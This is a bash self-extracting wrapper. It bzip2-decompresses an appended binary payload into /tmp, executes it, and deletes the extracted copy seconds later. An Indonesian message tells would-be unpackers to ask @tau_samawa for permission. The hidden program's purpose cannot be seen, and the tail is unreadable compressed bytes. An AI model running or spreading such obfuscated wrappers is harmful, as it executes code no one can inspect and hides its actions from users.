#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYrlH S_�u������������PD@  `gԉA@  %��a&���MO#I��	��ш�b1�4���h���4 4�  Ѧ@�� 1  p ���d 4� ѓ   @� �L�F� 2`�� �@h i� h� FL� %2 !���Q���@�ڍOQ�z���e44ѠoJf��w(H�(��l��5����>�v���R�����,x�ӿMY��
�K��^���� �&x�~^܄+�����R�}��HG�3�7?6��V�YbaKr�aC�W�(�5Si�}˫��D"<T8�Y.MhZī=goi�04�D�t\�+4`�W����>�+r���r�)h�q�uE�L��UdtD���b�S*2^�}Qַt떴�+N
Ϗa=x�9n�Ry��p��W#��QE4e�L1��͜���9�{OPS��"���z�h�!a�؋��"�`d3Թm�IQ=a�`w lЧ������������p��� ������?��1��Տ��ۤ�PM�xDJ�qT�uc@�Br3�'�Z�]h�x�l��H�P�B_� �� =���O�����o����F�fqk���r3��ġ�2#Q�kUet�!j��H��鏝�EАx�@H�oZ�s�Q� <�Zl�X�D�n�"�"zv��z �z��������� 
B��p��B�5f�!h��ஆ1��*{�aJ�^�笫x���\󶞦+���D�m �-�:ŧ|�.�a�"n�I�C�WTt*����M����ZH?h�Q�u�aL�Y�i<��B%��I�m6U�"{/����'� ٍ/��Q�� �-����	1�^�0�)��Vhp؍B2iQ�R����^������V�OA|�#7�_�ɼ��'���^��l�y{:F������8*c�|������)�%3�� 6���#Z�����|��f�av�n,����51��fE~\�P�_�&�C`6:χ:��y��E�a�t���%1˺��l��5�����@P�rZ /���S��2Uݯ���K��妚��^j� `�c�A]&Z�Z~�=�vk�v��Cpph�*�ab�II�A�u��<�7mH� p<��n8�B��p�t.�g<Ⱥ�Pw���Ag�r��g�wq���M�WT�$�xV�ܯ&T�i��j=����H���*��%�Z��l��l6ZK��AQ����Y�v5|<�Cl��I ^$�`�To����Ӡn��w��d3Xa�G���¶@~�d"�b�����#N|G?M��Z;Zwv%*D!8�(����1�E�M�h�U%r "
@'Ѐ÷.rΌ���2�AML���qqX�����T��z�Y����,@3ﵭF���ߙ@� �����M\�x摃ID�m*D��W+E!S����C8��&�	� ��3u�%�㝅����8.�
��r��^��`R�SPbU��Kղ%��U&���K&X~D�f��;
��t��[>KQ���\��Y�̹X�Y^ٔ�����(S$� Ι�/�ӎ%5֪m����R1.�Wۓ�U%1a0ߍX�&�_���D���i 2Ӱ*D��c��P�
��k�9Зh�r�h��i3 QOx������u8��q�!1!	�����$ 
�Lc?���)��b@�